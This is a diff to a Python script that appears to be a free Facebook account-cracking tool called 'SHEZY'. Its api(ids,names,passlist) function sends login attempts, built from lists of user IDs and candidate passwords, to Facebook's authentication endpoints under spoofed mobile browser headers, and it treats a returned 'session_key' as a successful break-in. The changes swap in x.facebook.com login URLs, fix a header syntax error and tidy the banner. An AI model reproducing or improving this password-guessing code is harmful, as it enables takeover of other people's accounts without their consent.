@@ -76,11 +76,11 @@ logo = ("""
  
 
    \x1b[1;92m╔\033[1;91mKST\033[1;92m═══════════════════════\033[1;91mKST\033[1;92m╗
-   \x1b[1;92m║➣TOOL NAME : SHEZY      ║
-   \x1b[1;92m║➣AUTHOR    : XD         ║
-   \x1b[1;92m║➣TOOLS     : NEW UPDATE     ║
-   \x1b[1;92m║➣FACEBOOK  : Shezy Malik         ║
-   \x1b[1;92m║➣Group     : SAJJAD & NADIR🥀❤️║
+   \x1b[1;92m║➣TOOL NAME : SHEZY           ║
+   \x1b[1;92m║➣AUTHOR    : XD              ║
+   \x1b[1;92m║➣TOOLS     : NEW UPDATE      ║
+   \x1b[1;92m║➣FACEBOOK  : Shezy Malik     ║
+   \x1b[1;92m║➣Group     : SAJJAD & NADIR❤️ ║
    \x1b[1;92m║➣Stetus    : FREE            ║
    \x1b[1;92m╚\033[1;91mKST\033[1;92m═══════════════════════\033[1;91mKST\033[1;92m╝""")
 
@@ -553,11 +553,11 @@ def api(ids,names,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-    'authority': 'm.facebook.com',
+    'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0'
-    'referer': 'https://www.google.com/',
+    'cache-control': 'max-age=0',
+    'referer': 'https://x.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjg3NDQ1OTE5LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&ref=dbl',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
     'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
@@ -571,7 +571,7 @@ def api(ids,names,passlist):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
 }
-                                url = 'https://m.facebook.com/',
+                                url = 'https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
